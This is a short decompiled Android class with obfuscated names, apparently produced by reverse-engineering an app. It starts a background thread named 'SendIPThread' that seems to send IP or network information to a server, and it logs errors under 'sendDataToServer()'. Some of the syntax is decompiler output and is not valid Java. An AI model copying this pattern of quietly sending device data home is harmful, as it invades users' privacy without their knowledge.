package com.app.system.common.f;

import android.content.Context;
import com.app.system.common.entity.IPInfo;
import com.app.system.common.h;
import com.app.system.common.h.a;
import java.util.Date;
import java.util.List;

public class i
  extends a
{
  public static void a(Context paramContext, boolean paramBoolean)
  {
    try
    {
      Thread local1 = new com/app/system/common/f/i$1;
      local1.<init>("SendIPThread", paramBoolean, paramContext);
      local1.start();
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("SendIP", "sendDataToServer()", new Object[] { paramContext });
    }
  }
}


/* Location:              ~/com/app/system/common/f/i.class
 *
 * Reversed by:           J
 */